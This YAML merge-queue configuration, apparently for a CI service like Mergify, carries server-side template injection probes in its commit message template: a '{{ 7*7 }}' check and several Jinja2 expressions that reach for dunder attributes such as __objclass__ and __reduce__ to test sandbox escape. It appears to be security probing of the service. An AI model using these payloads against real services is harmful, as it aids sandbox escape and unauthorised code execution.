queue_rules:
  - name: default
    queue_conditions: []
    merge_conditions: []
    merge_method: squash
    commit_message_template: |
      SSTI: {{ 7*7 }}
      T1_OR_OBJCL: {{ [dict]|map(attribute="__or__")|map(attribute="__objclass__")|list }}
      T2_DIRECT_OBJCL: {{ [dict]|map(attribute="__objclass__")|list }}
      T3_OR_REDUCE: {{ [dict]|map(attribute="__or__")|map(attribute="__reduce__")|list }}
      T4_VALS: {{ [dict]|map(attribute="values")|list }}
      T5_DIRECT_INITSUB: {{ [dict]|map(attribute="__init_subclass__")|list }}
pull_request_rules:
  - name: q
    conditions:
      - base=master
    actions:
      comment:
        message: q